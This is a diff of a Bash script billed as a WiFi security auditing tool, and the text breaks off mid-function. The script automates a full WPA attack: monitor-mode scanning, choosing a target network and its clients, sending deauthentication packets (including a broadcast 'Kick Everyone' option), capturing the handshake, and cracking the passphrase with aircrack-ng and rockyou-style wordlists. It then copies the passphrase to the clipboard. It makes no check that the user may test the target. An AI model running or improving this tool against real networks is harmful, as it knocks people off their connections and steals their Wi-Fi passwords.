@@ -4,12 +4,9 @@
 # Description: Automated WiFi Security Auditing Tool for Arch/Hyprland
 # Hardware:    Hardware Agnostic (Auto-detects Intel/Atheros/Realtek)
 # Author:      Elite DevOps
-# Version:     2.0.0 (Fully Optimized)
+# Version:     2.1.2 (v2.1 Back to Client + v2.2 Back to Target)
 # Requires:    Bash 5.0+
 # -----------------------------------------------------------------------------
-
-
-# if you want to change the amoutn of deauth signals sent. change this to either 1,2,3,4 or 5. no more. `local burst=1`
 
 # Strict mode with better error handling
 set -euo pipefail
@@ -66,9 +63,10 @@ declare -g TARGET_ESSID=""
 declare -g TARGET_ESSID_SAFE=""
 declare -g FINAL_WORDLIST=""
 declare -ga CONNECTED_CLIENTS=()
+declare -g CLEANUP_IN_PROGRESS=0
 
 # -----------------------------------------------------------------------------
-# UTILITIES - Using printf consistently for POSIX compliance
+# UTILITIES
 # -----------------------------------------------------------------------------
 log_info()    { printf '%s[INFO]%s %s\n' "$BLUE" "$NC" "$1"; }
 log_success() { printf '%s[OK]%s %s\n' "$GREEN" "$NC" "$1"; }
@@ -89,7 +87,6 @@ if [[ $EUID -ne 0 ]]; then
     log_info "Elevating permissions to root (required for hardware access)..."
     exec sudo --preserve-env=TERM,WAYLAND_DISPLAY,XDG_RUNTIME_DIR,DISPLAY \
         bash -- "$0" "$@"
-    # exec replaces process; this line is never reached
 fi
 
 # Determine real user (the one who invoked sudo)
@@ -109,16 +106,15 @@ fi
 [[ -d "$REAL_HOME" ]] || die "User home directory not found: $REAL_HOME"
 
 # -----------------------------------------------------------------------------
-# RUN AS USER - Fixed environment variable handling
+# RUN AS USER
 # -----------------------------------------------------------------------------
 run_as_user() {
     local xdg="${XDG_RUNTIME_DIR:-/run/user/$REAL_UID}"
     local -a env_args=("XDG_RUNTIME_DIR=$xdg")
     
-    # FIX: Auto-detect Wayland display if variable was lost by sudo
+    # Auto-detect Wayland display if variable was lost by sudo
     local wd="${WAYLAND_DISPLAY:-}"
     if [[ -z "$wd" ]]; then
-        # Look for the first wayland socket in the user's runtime dir
         local sockets=("$xdg"/wayland-*)
         if [[ -e "${sockets[0]}" ]]; then
             wd="${sockets[0]##*/}"
@@ -133,19 +129,17 @@ run_as_user() {
 }
 
 # -----------------------------------------------------------------------------
-# CLIPBOARD - Unified X11/Wayland support
+# CLIPBOARD
 # -----------------------------------------------------------------------------
 copy_to_clipboard() {
     local text="$1"
     
-    # FIX: Prioritize wl-copy if installed, regardless of environment variables
     if command -v wl-copy &>/dev/null; then
         if printf '%s' "$text" | run_as_user wl-copy --trim-newline 2>/dev/null; then
             return 0
         fi
     fi
     
-    # Fallback to X11 tools
     if command -v xclip &>/dev/null; then
         printf '%s' "$text" | run_as_user xclip -selection clipboard 2>/dev/null
         return $?
@@ -158,40 +152,41 @@ copy_to_clipboard() {
 }
 
 # -----------------------------------------------------------------------------
-# CLEANUP TRAP - More robust with proper signal handling
+# IMPROVED CLEANUP TRAP (Cherry-picked from v3.0)
 # -----------------------------------------------------------------------------
 cleanup() {
+    # Prevent re-entrancy (cleanup calling itself)
+    ((CLEANUP_IN_PROGRESS)) && return
+    CLEANUP_IN_PROGRESS=1
+    
     local exit_code=$?
     
-    # Prevent re-entrancy
-    trap '' EXIT INT TERM HUP
+    # Block all signals during cleanup
+    trap '' EXIT INT TERM HUP QUIT
     
     printf '\n'
     log_info "Initiating cleanup sequence..."
 
-    # Kill all child processes of this script using process group
-    # More reliable than pkill -P
-    local pgid
-    pgid=$(ps -o pgid= -p "$$" 2>/dev/null | tr -d ' ') || true
-    if [[ -n "$pgid" && "$pgid" != "$$" ]]; then
-        kill -TERM -"$pgid" 2>/dev/null || true
+    # 1. Kill child processes gracefully using jobs list (Safer than pkill -P)
+    local children
+    children=$(jobs -p 2>/dev/null) || true
+    if [[ -n "$children" ]]; then
+        # shellcheck disable=SC2086
+        kill -TERM $children 2>/dev/null || true
+        sleep 0.5
+        # shellcheck disable=SC2086
+        kill -KILL $children 2>/dev/null || true
     fi
     
-    # Kill specific known processes (fallback)
-    pkill -P "$SCRIPT_PID" 2>/dev/null || true
+    # 2. Kill specific tools related to this script instance
+    # We use regex to be safe but targeted
+    pkill -f "airodump-ng.*${MON_IFACE:-notset}" 2>/dev/null || true
+    pkill -f "aireplay-ng.*${MON_IFACE:-notset}" 2>/dev/null || true
+    pkill -f "bully.*${MON_IFACE:-notset}" 2>/dev/null || true
     
-    # Small delay for child processes to terminate gracefully
     sleep 0.5
 
-    # Kill any lingering airodump/aireplay processes by name
-    pkill -f "airodump-ng" 2>/dev/null || true
-    pkill -f "aireplay-ng" 2>/dev/null || true
-    pkill -f "bully" 2>/dev/null || true
-    
-    # Wait for processes to fully terminate
-    sleep 0.5
-
-    # Cleanup Monitor Interface if it was set by this script
+    # 3. Stop Monitor Interface
     if [[ -n "${MON_IFACE:-}" ]]; then
         if ip link show "$MON_IFACE" &>/dev/null; then
             log_info "Stopping monitor mode on $MON_IFACE..."
@@ -199,7 +194,7 @@ cleanup() {
         fi
     fi
 
-    # Restore NetworkManager only if it was originally running
+    # 4. Restore NetworkManager
     if [[ "${ORIGINAL_NM_STATE:-}" == "active" ]]; then
         if ! systemctl is-active --quiet NetworkManager; then
             log_info "Restarting NetworkManager..."
@@ -213,7 +208,7 @@ cleanup() {
         fi
     fi
 
-    # Secure cleanup of temporary directory
+    # 5. Cleanup Temp Dir
     if [[ -d "$TMP_DIR" ]]; then
         rm -rf -- "$TMP_DIR"
     fi
@@ -223,14 +218,12 @@ cleanup() {
 }
 
 # Set up traps for multiple signals
-trap cleanup EXIT
-trap 'trap - EXIT; cleanup' INT TERM HUP
+trap cleanup EXIT INT TERM HUP QUIT
 
 # -----------------------------------------------------------------------------
-# DEPENDENCY CHECK - Fixed partial upgrade issue
+# DEPENDENCY CHECK
 # -----------------------------------------------------------------------------
 check_deps() {
-    # Store original NetworkManager state for cleanup
     if systemctl is-active --quiet NetworkManager 2>/dev/null; then
         ORIGINAL_NM_STATE="active"
     else
@@ -274,7 +267,6 @@ check_deps() {
         esac
     fi
     
-    # FIX: Simple check for ANY clipboard tool
     if ! command -v wl-copy &>/dev/null && ! command -v xclip &>/dev/null && ! command -v xsel &>/dev/null; then
         log_warn "No clipboard tools found. Install 'wl-clipboard' (Wayland) or 'xclip' (X11)."
     fi
@@ -283,19 +275,13 @@ check_deps() {
 }
 
 # -----------------------------------------------------------------------------
-# PATH VALIDATION - Fixed regex and improved security
+# PATH VALIDATION
 # -----------------------------------------------------------------------------
 validate_path() {
     local path="$1"
-    
-    # Empty path is invalid
     [[ -z "$path" ]] && return 1
     
-    # Disallow dangerous shell metacharacters using glob pattern (more reliable than regex)
-    # Characters: ` $ ( ) ; & | < > ! * ? [ ] { } ' " and backtick
     local dangerous_chars=$'`$();&|<>!*?[]{}\'"\\'
-    
-    # Check each dangerous character
     local char i
     for ((i=0; i<${#dangerous_chars}; i++)); do
         char="${dangerous_chars:i:1}"
@@ -305,27 +291,15 @@ validate_path() {
         fi
     done
     
-    # Disallow null bytes (shouldn't be possible in bash, but defense in depth)
-    if [[ "$path" =~ $'\x00' ]]; then
-        return 1
-    fi
+    if [[ "$path" =~ $'\x00' ]]; then return 1; fi
     
-    # Disallow control characters (except common whitespace handled by quoting)
-    # Using POSIX character class
     if [[ "$path" =~ [[:cntrl:]] ]]; then
-        # Allow tabs and newlines in path (though unusual)
         local cleaned="${path//$'\t'/}"
         cleaned="${cleaned//$'\n'/}"
-        if [[ "$cleaned" =~ [[:cntrl:]] ]]; then
-            return 1
-        fi
+        if [[ "$cleaned" =~ [[:cntrl:]] ]]; then return 1; fi
     fi
     
-    # Disallow paths starting with - (could be interpreted as options)
-    if [[ "$path" == -* ]]; then
-        return 1
-    fi
-    
+    if [[ "$path" == -* ]]; then return 1; fi
     return 0
 }
 
@@ -347,28 +321,23 @@ setup_directories() {
     if [[ -z "$user_hs_path" ]]; then
         HANDSHAKE_DIR="$default_handshake_dir"
     elif validate_path "$user_hs_path"; then
-        # Remove trailing slash and normalize
         HANDSHAKE_DIR="${user_hs_path%/}"
     else
         log_warn "Invalid characters in path. Using default."
         HANDSHAKE_DIR="$default_handshake_dir"
     fi
 
-    # Create directory with proper ownership
     if [[ ! -d "$HANDSHAKE_DIR" ]]; then
-        # Try as user first, fall back to root
         if ! run_as_user mkdir -p -- "$HANDSHAKE_DIR" 2>/dev/null; then
             mkdir -p -- "$HANDSHAKE_DIR" || die "Failed to create handshake directory"
         fi
     fi
     
-    # Set ownership recursively for the project directory if it exists
     if [[ -d "$default_project_dir" ]]; then
         chown -R "$REAL_USER":"$REAL_GROUP" -- "$default_project_dir" 2>/dev/null || true
         chmod -R u=rwX,g=rX,o=rX -- "$default_project_dir" 2>/dev/null || true
     fi
 
-    # Ensure handshake directory has proper permissions
     chown -R "$REAL_USER":"$REAL_GROUP" -- "$HANDSHAKE_DIR" 2>/dev/null || true
     chmod -R u=rwX,g=rX,o=rX -- "$HANDSHAKE_DIR" 2>/dev/null || true
     
@@ -422,11 +391,8 @@ select_interface() {
     log_info "Scanning for wireless interfaces..."
     
     local -a interfaces
-    
-    # Try to find normal Managed interfaces first
     mapfile -t interfaces < <(get_interfaces_by_type "managed")
 
-    # AUTO-FIX: If no managed interfaces, check for leftover Monitor interfaces
     if ((${#interfaces[@]} == 0)); then
         local -a monitors
         mapfile -t monitors < <(get_interfaces_by_type "monitor")
@@ -443,7 +409,6 @@ select_interface() {
             log_info "Waiting for drivers to reset..."
             sleep 2
             
-            # Re-scan for managed interfaces
             mapfile -t interfaces < <(get_interfaces_by_type "managed")
             
             if ((${#interfaces[@]} > 0)); then
@@ -479,12 +444,10 @@ select_interface() {
 # HARDWARE OPTIMIZATION & MONITOR MODE
 # -----------------------------------------------------------------------------
 detect_hardware() {
-    # Check for Intel (iwlwifi/iwlmvm) which is common in laptops like AX201
     if lspci 2>/dev/null | grep -qi "Network controller.*Intel"; then
         log_success "Detected Intel Wi-Fi Hardware."
         return 0
     fi
-    
     log_info "Detected Generic/Other Wi-Fi Hardware."
     return 1
 }
@@ -502,20 +465,17 @@ enable_monitor_mode() {
     
     sleep 1
 
-    # Try to detect monitor interface from iw dev
     MON_IFACE=$(iw dev 2>/dev/null | awk '
         /Interface/ { name = $2; next }
         /type monitor/ { if (name != "") print name; name = "" }
     ' | head -n1)
     
-    # Fallback: parse airmon-ng output
     if [[ -z "$MON_IFACE" ]]; then
         MON_IFACE=$(printf '%s' "$output" | \
             grep -oP 'monitor mode.*enabled on \K[^\)]+' | \
             tr -d '[:space:][]')
     fi
     
-    # Last resort: common naming patterns
     if [[ -z "$MON_IFACE" ]]; then
         for candidate in "${PHY_IFACE}mon" "wlan0mon" "wlan1mon"; do
             if ip link show "$candidate" &>/dev/null; then
@@ -528,11 +488,8 @@ enable_monitor_mode() {
     [[ -n "$MON_IFACE" ]] || die "Could not determine monitor interface name."
 
     log_success "Monitor mode active on: $MON_IFACE"
-
-    # Ensure interface is up
     ip link set "$MON_IFACE" up &>/dev/null || true
     
-    # Hardware-specific optimizations
     if detect_hardware; then
         log_info "Attempting Intel optimizations (Power Save OFF)..."
         if ! iw dev "$MON_IFACE" set power_save off 2>/dev/null; then
@@ -547,13 +504,15 @@ enable_monitor_mode() {
 # SCANNING
 # -----------------------------------------------------------------------------
 scan_targets() {
+    # Ensure fresh scan data by removing previous files
+    rm -f -- "$TMP_DIR/$SCAN_PREFIX"* 2>/dev/null || true
+
     log_info "Starting network scan (2.4GHz & 5GHz)..."
     log_info "Scanning for 10 seconds. Please wait..."
 
     local scan_duration=10
     local timeout_duration=$((scan_duration + 10))
     
-    # Start airodump with timeout protection
     timeout --signal=SIGTERM "${timeout_duration}s" \
         airodump-ng --band abg \
         -w "$TMP_DIR/$SCAN_PREFIX" \
@@ -562,7 +521,6 @@ scan_targets() {
         -- "$MON_IFACE" &>/dev/null &
     local pid=$!
     
-    # Visual countdown
     local i
     for ((i=scan_duration; i>0; i--)); do
         printf '\rScanning... %2d ' "$i"
@@ -570,16 +528,12 @@ scan_targets() {
     done
     printf '\rScanning... Done.\n'
     
-    # Gracefully terminate and wait
     kill "$pid" &>/dev/null || true
     wait "$pid" 2>/dev/null || true
-    
-    # Sync filesystem and wait for file writes
     sync
     sleep 1
 
     local csv_file="$TMP_DIR/$SCAN_PREFIX-01.csv"
-    
     [[ -f "$csv_file" ]] || die "Scan failed to generate output."
 
     log_info "Parsing targets..."
@@ -587,21 +541,15 @@ scan_targets() {
     
     local -a target_lines
     
-    # Parse CSV with robust AWK
     mapfile -t target_lines < <(gawk -F',' '
         BEGIN { IGNORECASE = 1 }
-        
-        # Stop at station section
         /Station MAC/ { exit }
-        
-        # Process AP lines - validate BSSID format
         $1 ~ /^[[:space:]]*([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}[[:space:]]*$/ {
-            # Clean all fields
-            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $1)   # BSSID
-            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $4)   # Channel
-            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $6)   # Privacy
-            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $9)   # Power
-            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $14)  # ESSID
+            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $1)
+            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $4)
+            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $6)
+            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $9)
+            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $14)
             
             bssid = $1
             pwr = $9
@@ -609,10 +557,8 @@ scan_targets() {
             priv = $6
             essid = $14
             
-            # Skip if no ESSID
             if (length(essid) < 1) next
             
-            # Validate and derive Band from Channel
             if (ch < 1 || ch > 196) {
                 band = "N/A"
                 ch = 0
@@ -624,14 +570,12 @@ scan_targets() {
                 band = "N/A"
             }
             
-            # Output: BSSID,Power,CH,Band,Privacy,ESSID
             printf "%s,%s,%d,%s,%s,%s\n", bssid, pwr, ch, band, priv, essid
         }
     ' "$csv_file")
 
     ((${#target_lines[@]} > 0)) || die "No networks found."
 
-    # Print header
     printf '%s%-3s | %-17s | %-4s | %-4s | %-5s | %-8s | %s%s\n' \
         "$CYAN" "ID" "BSSID" "PWR" "CH" "BAND" "SEC" "ESSID" "$NC"
     printf '%.0s-' {1..75}
@@ -669,14 +613,10 @@ scan_targets() {
     TARGET_CH="${channels[idx]}"
     TARGET_ESSID="${essids[idx]}"
     
-    # Safe filename: replace non-alphanumeric with underscore
     TARGET_ESSID_SAFE="${TARGET_ESSID//[^a-zA-Z0-9_-]/_}"
-    # Collapse multiple underscores
     TARGET_ESSID_SAFE="${TARGET_ESSID_SAFE//+(_)/_}"
-    # Remove leading/trailing underscores
     TARGET_ESSID_SAFE="${TARGET_ESSID_SAFE#_}"
     TARGET_ESSID_SAFE="${TARGET_ESSID_SAFE%_}"
-    # Fallback for empty result
     [[ -n "$TARGET_ESSID_SAFE" ]] || TARGET_ESSID_SAFE="network"
 
     log_success "Target Locked: $TARGET_ESSID ($TARGET_BSSID) on CH $TARGET_CH"
@@ -713,16 +653,12 @@ find_rockyou() {
 prepare_wordlist() {
     log_info "Preparing Wordlists from: $LIST_DIR"
     
-    # Check if directory has any regular files
     local -a list_files
-    mapfile -t list_files < <(find "$LIST_DIR" -maxdepth 1 -type f 2>/dev/null)
+    mapfile -t list_files < <(find "$LIST_DIR" -maxdepth 1 -type f 2>/dev/null | sort)
     
     if ((${#list_files[@]} > 0)); then
         log_info "Found ${#list_files[@]} password list(s). Merging..."
-        
         local combined_wordlist="$TMP_DIR/combined_passwords.txt"
-        
-        # Merge files, handling potential errors
         if cat -- "${list_files[@]}" > "$combined_wordlist" 2>/dev/null; then
             local count
             count=$(wc -l < "$combined_wordlist")
@@ -734,7 +670,6 @@ prepare_wordlist() {
         fi
     else
         log_warn "No files found in $LIST_DIR."
-        
         local rockyou_path=""
         if rockyou_path=$(find_rockyou); then
             printf 'Options:\n'
@@ -757,7 +692,6 @@ prepare_wordlist() {
                     fi
                     ;;
                 *)
-                    # Handle .gz files
                     if [[ "$rockyou_path" == *.gz ]]; then
                         log_info "Decompressing rockyou.txt.gz..."
                         FINAL_WORDLIST="$TMP_DIR/rockyou.txt"
@@ -788,15 +722,11 @@ prepare_wordlist() {
 }
 
 # -----------------------------------------------------------------------------
-# CLIENT SCANNING & PARSING
+# CLIENT SCANNING
 # -----------------------------------------------------------------------------
 perform_client_micro_scan() {
     log_info "Performing targeted client discovery scan (5s)..."
-    
-    # Delete previous scan files to ensure clean state
     rm -f -- "$TMP_DIR/$CLIENT_SCAN_PREFIX"* 2>/dev/null || true
-
-    # Start scan with timeout protection
     timeout --signal=SIGTERM 10s \
         airodump-ng \
         --bssid "$TARGET_BSSID" \
@@ -806,19 +736,14 @@ perform_client_micro_scan() {
         -- "$MON_IFACE" &>/dev/null &
     local scan_pid=$!
     
-    # Visual progress
     local i
     for ((i=1; i<=5; i++)); do
         printf '.'
         sleep 1
     done
     printf '\n'
-    
-    # Clean termination
     kill "$scan_pid" &>/dev/null || true
     wait "$scan_pid" 2>/dev/null || true
-    
-    # Sync and brief wait
     sync
     sleep 0.5
 }
@@ -829,7 +754,6 @@ get_connected_clients() {
     local initial_csv="$TMP_DIR/$SCAN_PREFIX-01.csv"
     local source_csv=""
 
-    # Retry logic for user-generated capture file
     if [[ -n "$custom_csv" ]]; then
         local attempts=0
         while [[ ! -f "$custom_csv" ]] && ((attempts < 5)); do
@@ -839,7 +763,6 @@ get_connected_clients() {
         [[ -f "$custom_csv" ]] && source_csv="$custom_csv"
     fi
     
-    # Fallback cascade
     if [[ -z "$source_csv" ]]; then
         if [[ -f "$specific_csv" ]]; then
             source_csv="$specific_csv"
@@ -851,39 +774,25 @@ get_connected_clients() {
         fi
     fi
 
-    # Parse stations with TIME FILTERING (The Fix)
     mapfile -t CONNECTED_CLIENTS < <(gawk -F',' -v target="$TARGET_BSSID" '
         BEGIN { IGNORECASE = 1 }
-        
-        # Strip carriage returns globally
         { gsub(/\r/, "") }
-        
-        # Start processing after "Station MAC" header
         /Station MAC/ { in_stations = 1; next }
-        
         in_stations == 1 {
-            # Clean relevant fields
-            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $1)  # Station MAC
-            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $3)  # Last time seen
-            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $4)  # Power
-            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $6)  # Associated BSSID
+            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $1)
+            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $3)
+            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $4)
+            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $6)
             
-            # --- TIME FILTER LOGIC ---
-            # Parse "YYYY-MM-DD HH:MM:SS" into epoch time
             last_seen_str = $3
-            gsub(/[-:]/, " ", last_seen_str) # Convert to "YYYY MM DD HH MM SS"
-            
+            gsub(/[-:]/, " ", last_seen_str)
             last_seen_ts = mktime(last_seen_str)
             current_ts = systime()
             
-            # If the client hasn"t been seen in 60 seconds, SKIP IT.
-            # (Only applies if we successfully parsed a timestamp)
             if (last_seen_ts > 0 && (current_ts - last_seen_ts) > 60) {
                 next
             }
-            # -------------------------
 
-            # Match against target BSSID
             if (toupper($6) == toupper(target) && $1 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/) {
                 printf "%s,%s\n", $1, $4
             }
@@ -905,7 +814,6 @@ attack_wpa_handshake() {
     timestamp=$(date +%Y%m%d_%H%M%S)
     local capture_base="${HANDSHAKE_DIR}/${TARGET_ESSID_SAFE}_${timestamp}"
     
-    # Build command with proper quoting for display
     local record_cmd
     record_cmd="sudo airodump-ng -c ${TARGET_CH} --bssid ${TARGET_BSSID} -w '${capture_base}' ${MON_IFACE}"
 
@@ -925,113 +833,115 @@ attack_wpa_handshake() {
 
     read -r -p "Press ENTER when recorder is running..."
 
-    # Client selection loop
     local target_mac=""
     local user_capture_csv="${capture_base}-01.csv"
 
+    # Master loop to allow going back to selection
     while true; do
-        get_connected_clients "$user_capture_csv"
-        
-        printf '\nTarget Selection:\n'
-        printf '1) Broadcast Deauth (Kick Everyone)\n'
-        
-        local c=2
-        if ((${#CONNECTED_CLIENTS[@]} > 0)); then
-            local client mac pwr
-            for client in "${CONNECTED_CLIENTS[@]}"; do
-                IFS=',' read -r mac pwr <<< "$client"
-                printf '%d) Specific Client: %s (Signal: %s dBm)\n' "$c" "$mac" "${pwr:-?}"
-                ((c++))
-            done
-        else
-            printf '   (No connected clients found yet)\n'
-        fi
-        
-        printf 'r) Refresh Client List (Read Capture File)\n'
-        
-        local sel
-        read -r -p "Select Target [1-$((c-1))] or 'r' (Default 1): " sel
-        sel="${sel:-1}"
-        
-        # Refresh logic
-        if [[ "${sel,,}" == "r" ]]; then
-            log_info "Reloading client data from capture file..."
-            sleep 0.5
-            continue
-        fi
-        
-        # Selection validation
-        if [[ "$sel" =~ ^[0-9]+$ ]]; then
-            if ((sel == 1)); then
-                log_info "Targeting Broadcast (All Clients)"
-                target_mac=""
-                break
-            elif ((sel > 1 && sel < c)); then
-                local client_idx=$((sel - 2))
-                local selected_line="${CONNECTED_CLIENTS[client_idx]}"
-                local raw_mac="${selected_line%%,*}"
-                
-                # Sanitize MAC address
-                target_mac="${raw_mac//[^0-9A-Fa-f:]/}"
-                
-                if [[ "$target_mac" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
-                    log_info "Targeting specific client: $target_mac"
+
+        # Sub-loop for Target Selection
+        while true; do
+            get_connected_clients "$user_capture_csv"
+            
+            printf '\nTarget Selection:\n'
+            printf '1) Broadcast Deauth (Kick Everyone)\n'
+            
+            local c=2
+            if ((${#CONNECTED_CLIENTS[@]} > 0)); then
+                local client mac pwr
+                for client in "${CONNECTED_CLIENTS[@]}"; do
+                    IFS=',' read -r mac pwr <<< "$client"
+                    printf '%d) Specific Client: %s (Signal: %s dBm)\n' "$c" "$mac" "${pwr:-?}"
+                    ((c++))
+                done
+            else
+                printf '   (No connected clients found yet)\n'
+            fi
+            
+            printf 'r) Refresh Client List (Read Capture File)\n'
+            
+            local sel
+            read -r -p "Select Target [1-$((c-1))] or 'r' (Default 1): " sel
+            sel="${sel:-1}"
+            
+            if [[ "${sel,,}" == "r" ]]; then
+                log_info "Reloading client data from capture file..."
+                sleep 0.5
+                continue
+            fi
+            
+            if [[ "$sel" =~ ^[0-9]+$ ]]; then
+                if ((sel == 1)); then
+                    log_info "Targeting Broadcast (All Clients)"
+                    target_mac=""
                     break
+                elif ((sel > 1 && sel < c)); then
+                    local client_idx=$((sel - 2))
+                    local selected_line="${CONNECTED_CLIENTS[client_idx]}"
+                    local raw_mac="${selected_line%%,*}"
+                    target_mac="${raw_mac//[^0-9A-Fa-f:]/}"
+                    
+                    if [[ "$target_mac" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
+                        log_info "Targeting specific client: $target_mac"
+                        break
+                    else
+                        log_warn "Invalid MAC detected. Try rescanning."
+                    fi
                 else
-                    log_warn "Invalid MAC detected. Try rescanning."
+                    log_err "Invalid selection."
                 fi
             else
                 log_err "Invalid selection."
             fi
-        else
-            log_err "Invalid selection."
-        fi
-    done
-
-    # Deauth / Capture loop
-    printf '\n'
-    log_info "Step 2: Sending Deauth Packets"
-    
-    while true; do
-        local burst=1 # Change to how many every you want it to send. 3 is defualt, chagne to 2 or 1
-        log_info "Sending $burst groups of deauth packets..."
-
-        # Execute deauth with timeout protection
-        if [[ -n "$target_mac" ]]; then
-            timeout --signal=SIGTERM 30s \
-                aireplay-ng -0 "$burst" -a "$TARGET_BSSID" -c "$target_mac" -- "$MON_IFACE" || true
-        else
-            timeout --signal=SIGTERM 30s \
-                aireplay-ng -0 "$burst" -a "$TARGET_BSSID" -- "$MON_IFACE" || true
-        fi
+        done
 
         printf '\n'
-        log_success "Deauth burst complete."
-        printf "Check your other terminal for 'WPA Handshake: ...'\n"
+        log_info "Step 2: Sending Deauth Packets"
         
-        printf 'Options:\n'
-        printf 'y) Yes, captured - Start Cracking\n'
-        printf 'n) No, stop attack\n'
-        printf 'r) Retry Deauth (Send more packets)\n'
-        
-        local cap_choice
-        read -r -p "Choice [y/n/r]: " cap_choice
-        
-        case "${cap_choice,,}" in
-            y) break ;;
-            r) continue ;;
-            *)
-                log_info "Aborting attack."
-                return
-                ;;
-        esac
+        # Sub-loop for Attack Execution
+        while true; do
+            local burst=1 # Change this value to adjust burst size
+            log_info "Sending $burst groups of deauth packets..."
+
+            if [[ -n "$target_mac" ]]; then
+                timeout --signal=SIGTERM 30s \
+                    aireplay-ng -0 "$burst" -a "$TARGET_BSSID" -c "$target_mac" -- "$MON_IFACE" || true
+            else
+                timeout --signal=SIGTERM 30s \
+                    aireplay-ng -0 "$burst" -a "$TARGET_BSSID" -- "$MON_IFACE" || true
+            fi
+
+            printf '\n'
+            log_success "Deauth burst complete."
+            printf "Check your other terminal for 'WPA Handshake: ...'\n"
+            
+            printf 'Options:\n'
+            printf 'y) Yes, captured - Start Cracking\n'
+            printf 'n) No, stop attack\n'
+            printf 'r) Retry Deauth (Send more packets)\n'
+            printf 'b) Back to Client Selection\n'
+            printf 't) Back to Target (Network) Selection\n'
+            
+            local cap_choice
+            read -r -p "Choice [y/n/r/b/t] (Default: r): " cap_choice
+            cap_choice="${cap_choice:-r}"
+            
+            case "${cap_choice,,}" in
+                y) break 2 ;; # Proceed directly to cracking without checking
+                b) break ;;   # Break only Attack loop, returning to Selection loop
+                t) return 2 ;; # Return code 2 tells main() to restart scan_targets
+                r) continue ;;
+                *)
+                    log_info "Aborting attack."
+                    return 0
+                    ;;
+            esac
+        done
     done
     
-    # Locate capture file
     local cap_file="${capture_base}-01.cap"
     
     if [[ ! -f "$cap_file" ]]; then
-        # Fallback: search for matching files
         local found_cap
         found_cap=$(find "$HANDSHAKE_DIR" -maxdepth 1 \
             -name "${TARGET_ESSID_SAFE}_${timestamp}*.cap" \
@@ -1039,52 +949,69 @@ attack_wpa_handshake() {
         [[ -n "$found_cap" ]] && cap_file="$found_cap"
     fi
 
-    # Transfer ownership
     if [[ -f "$cap_file" ]]; then
         chown "$REAL_USER":"$REAL_GROUP" -- "$cap_file" 2>/dev/null || true
         log_info "Capture file ownership transferred to $REAL_USER."
     fi
 
-    # Cracking phase
-    if [[ -n "${FINAL_WORDLIST:-}" && -f "${FINAL_WORDLIST:-}" && -f "$cap_file" ]]; then
-        log_info "Step 3: Cracking Password..."
-        
-        local key_file="$TMP_DIR/cracked_key.txt"
-        rm -f -- "$key_file"
-        
-        # Run aircrack with key output file
-        aircrack-ng -w "$FINAL_WORDLIST" -l "$key_file" -- "$cap_file" || true
-        
-        if [[ -f "$key_file" && -s "$key_file" ]]; then
-            local cracked_key
-            cracked_key=$(<"$key_file")
+    # Step 3 Loop: Allows retrying if cracking fails or file was empty
+    while true; do
+        if [[ -n "${FINAL_WORDLIST:-}" && -f "${FINAL_WORDLIST:-}" && -f "$cap_file" ]]; then
+            log_info "Step 3: Cracking Password..."
             
-            printf '\n'
-            printf '%s%s**************************************************%s\n' "$GREEN" "$BOLD" "$NC"
-            printf '%s%s*                                                *%s\n' "$GREEN" "$BOLD" "$NC"
-            printf '%s%s*           PASSWORD CRACKED !!!                 *%s\n' "$GREEN" "$BOLD" "$NC"
-            printf '%s%s*                                                *%s\n' "$GREEN" "$BOLD" "$NC"
-            printf '%s%s**************************************************%s\n' "$GREEN" "$BOLD" "$NC"
-            printf '\n'
-            printf '%s%s   PASSPHRASE:  %s%s\n' "$CYAN" "$BOLD" "$cracked_key" "$NC"
-            printf '\n'
-            printf '%s%s**************************************************%s\n' "$GREEN" "$BOLD" "$NC"
-            printf '\n'
+            local key_file="$TMP_DIR/cracked_key.txt"
+            rm -f -- "$key_file"
             
-            if copy_to_clipboard "$cracked_key"; then
-                log_success "Password copied to clipboard!"
+            aircrack-ng -w "$FINAL_WORDLIST" -l "$key_file" -- "$cap_file" || true
+            
+            if [[ -f "$key_file" && -s "$key_file" ]]; then
+                local cracked_key
+                cracked_key=$(<"$key_file")
+                
+                printf '\n'
+                printf '%s%s**************************************************%s\n' "$GREEN" "$BOLD" "$NC"
+                printf '%s%s* *%s\n' "$GREEN" "$BOLD" "$NC"
+                printf '%s%s* PASSWORD CRACKED !!!                 *%s\n' "$GREEN" "$BOLD" "$NC"
+                printf '%s%s* *%s\n' "$GREEN" "$BOLD" "$NC"
+                printf '%s%s**************************************************%s\n' "$GREEN" "$BOLD" "$NC"
+                printf '\n'
+                printf '%s%s   PASSPHRASE:  %s%s\n' "$CYAN" "$BOLD" "$cracked_key" "$NC"
+                printf '\n'
+                
+                if copy_to_clipboard "$cracked_key"; then
+                    log_success "Password copied to clipboard!"
+                fi
+                return 0 # Success exit
+            else
+                log_warn "Password not found OR handshake invalid."
             fi
-        else
-            log_warn "Password not found in the provided wordlist."
+        elif [[ -f "$cap_file" ]]; then
             log_info "Capture file saved at: $cap_file"
-            log_info "You can try cracking later with: aircrack-ng -w <wordlist> '$cap_file'"
+            log_info "No wordlist available. Crack later with: aircrack-ng -w <wordlist> '$cap_file'"
+            return 0
+        else
+            log_warn "Capture file not found."
         fi
-    elif [[ -f "$cap_file" ]]; then
-        log_info "Capture file saved at: $cap_file"
-        log_info "No wordlist available. Crack later with: aircrack-ng -w <wordlist> '$cap_file'"
-    else
-        log_warn "Capture file not found. The handshake may not have been captured."
-    fi
+
+        # Menu to retry if cracking failed
